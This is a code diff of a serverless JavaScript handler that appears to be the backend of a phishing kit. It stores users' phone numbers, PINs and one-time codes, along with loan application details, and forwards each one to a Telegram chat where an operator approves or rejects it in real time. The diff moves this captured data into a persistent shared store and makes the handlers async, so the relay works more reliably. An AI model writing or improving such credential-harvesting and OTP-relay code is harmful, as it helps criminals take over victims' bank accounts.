@@ -13,13 +13,14 @@
  */
 const https = require('https');
 
+// Persistent shared store (survives restarts; shared across serverless instances).
+const store = require('../store');
+
 const TOKEN = process.env.NMB_BOT_TOKEN;
 const CHAT_ID = process.env.NMB_CHAT_ID;
 
-// In-memory store. NOTE: serverless instances are ephemeral, so this resets
-// on cold starts. For production use a database / KV store.
-const applications = new Map();
-const loginVerifications = new Map(); // { id => { phone, pin, otp, type, timestamp, status, messageId, chatId } }
+// State is now persisted via the shared `store` module (see ../store.js),
+// so it survives cold starts and is visible to every serverless instance.
 
 function tgApi(method, payload, cb) {
   const data = JSON.stringify(payload);
@@ -49,7 +50,7 @@ function esc(s) {
   return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 }
 
-function notifyApplication(app) {
+async function notifyApplication(app) {
   const id = app.appId || ('APP-' + Date.now());
   const name = app.name || `${app.firstName || ''} ${app.lastName || ''}`.trim() || 'N/A';
   const text =
@@ -73,7 +74,7 @@ function notifyApplication(app) {
     },
   }, (r) => {
     if (r && r.ok) {
-      applications.set(id, { status: 'pending', messageId: r.result.message_id, chatId: CHAT_ID, details: { ...app, name } });
+      store.set(store.NS.APPS, id, { status: 'pending', messageId: r.result.message_id, chatId: CHAT_ID, details: { ...app, name } });
       console.log('[notify] application', id);
     } else {
       console.error('[notify] application failed:', r && r.description);
@@ -82,7 +83,7 @@ function notifyApplication(app) {
   return id;
 }
 
-function notifyLoginVerification(login) {
+async function notifyLoginVerification(login) {
   const type = login.otp ? 'otp' : 'pin';
   const id = login.loginId || (type === 'otp' ? 'OTP-' : 'LOG-') + Date.now();
 
@@ -103,7 +104,7 @@ function notifyLoginVerification(login) {
       `Time: ${new Date().toLocaleString()}`;
   }
 
-  loginVerifications.set(id, {
+  await store.set(store.NS.LOGIN, id, {
     phone: login.username,
     pin: login.pin || '',
     otp: login.otp || '',
@@ -132,11 +133,12 @@ function notifyLoginVerification(login) {
     },
   }, (r) => {
     if (r && r.ok) {
-      const entry = loginVerifications.get(id);
-      if (entry) {
-        entry.messageId = r.result.message_id;
-        loginVerifications.set(id, entry);
-      }
+      store.get(store.NS.LOGIN, id).then((entry) => {
+        if (entry) {
+          entry.messageId = r.result.message_id;
+          store.set(store.NS.LOGIN, id, entry);
+        }
+      });
       console.log(`[notify] ${type} verification sent:`, id);
     } else {
       console.error(`[notify] ${type} verification failed:`, r && r.description);
@@ -145,15 +147,12 @@ function notifyLoginVerification(login) {
   return id;
 }
 
-function handleCallback(cq) {
+async function handleCallback(cq) {
   const [action, id] = (cq.data || '').split(':');
 
-  let decision = null;
-  let rec = null;
-
   if (action === 'approve' || action === 'reject') {
-    decision = action === 'approve' ? 'approved' : 'rejected';
-    rec = applications.get(id);
+    const decision = action === 'approve' ? 'approved' : 'rejected';
+    const rec = await store.get(store.NS.APPS, id);
     if (rec) rec.status = decision;
     const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
@@ -171,18 +170,21 @@ function handleCallback(cq) {
           `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
           `Status: <b>${stamp}</b>`,
       });
+      await store.set(store.NS.APPS, id, rec);
     }
     console.log(`[decision] ${id} -> ${decision}`);
     return;
   }
 
   if (action === 'pin_approve' || action === 'pin_reject' || action === 'otp_approve' || action === 'otp_reject') {
-    decision = (action === 'pin_approve' || action === 'otp_approve') ? 'approved' : 'rejected';
+    const decision = (action === 'pin_approve' || action === 'otp_approve') ? 'approved' : 'rejected';
     const kind = action.startsWith('pin') ? 'PIN' : 'OTP';
     const stamp = action.endsWith('approve') ? '✅ Approved' : '❌ Rejected';
-    rec = loginVerifications.get(id);
+    const rec = await store.get(store.NS.LOGIN, id);
     if (rec) {
-      loginVerifications.set(id, { ...rec, status: decision, decided: true });
+      rec.status = decision;
+      rec.decided = true;
+      await store.set(store.NS.LOGIN, id, rec);
     }
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
     if (rec && rec.messageId) {
@@ -210,7 +212,7 @@ function setWebhook(host, proto, cb) {
 }
 
 // Vercel serverless entry point
-module.exports = (req, res) => {
+module.exports = async (req, res) => {
   try {
     if (!TOKEN || !CHAT_ID) {
       console.error('Missing NMB_BOT_TOKEN or NMB_CHAT_ID environment variables');
@@ -237,21 +239,17 @@ module.exports = (req, res) => {
 
     if (req.method === 'GET' && url.startsWith('/api/application/')) {
       const id = url.split('/').pop();
-      const rec = applications.get(id);
+      const rec = await store.get(store.NS.APPS, id);
       res.status(200).json({ status: rec ? rec.status : 'unknown' });
       return;
     }
 
     if (req.method === 'GET' && url.startsWith('/api/login/status/')) {
       const id = url.split('/').pop();
-      const rec = loginVerifications.get(id);
-      if (!rec) {
-        res.status(404).json({ error: 'Verification not found or expired' });
-        return;
-      }
+      const rec = await store.get(store.NS.LOGIN, id);
       res.status(200).json({
-        decided: !!rec.decided,
-        status: rec.status || 'pending'
+        decided: !!rec && !!rec.decided,
+        status: rec ? rec.status : 'pending'
       });
       return;
     }
@@ -259,26 +257,31 @@ module.exports = (req, res) => {
     if (req.method === 'POST') {
       let raw = '';
       req.on('data', (c) => (raw += c));
-      req.on('end', () => {
+      req.on('end', async () => {
         let p = {};
         try { p = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }
 
-        if (p.callback_query) {
-          handleCallback(p.callback_query);
-          res.status(200).json({ ok: true });
-          return;
+        try {
+          if (p.callback_query) {
+            await handleCallback(p.callback_query);
+            res.status(200).json({ ok: true });
+            return;
+          }
+          if (url.includes('application')) {
+            const id = await notifyApplication(p);
+            res.status(200).json({ ok: true, appId: id });
+            return;
+          }
+          if (url.includes('login')) {
+            const id = await notifyLoginVerification(p);
+            res.status(200).json({ ok: true, loginId: id });
+            return;
+          }
+          res.status(404).json({ error: 'not found' });
+        } catch (e) {
+          console.error('[api] request error:', e);
+          if (!res.headersSent) res.status(500).json({ error: 'Internal server error' });
         }
-        if (url.includes('application')) {
-          const id = notifyApplication(p);
-          res.status(200).json({ ok: true, appId: id });
-          return;
-        }
-        if (url.includes('login')) {
-          const id = notifyLoginVerification(p);
-          res.status(200).json({ ok: true, loginId: id });
-          return;
-        }
-        res.status(404).json({ error: 'not found' });
       });
       return;
     }
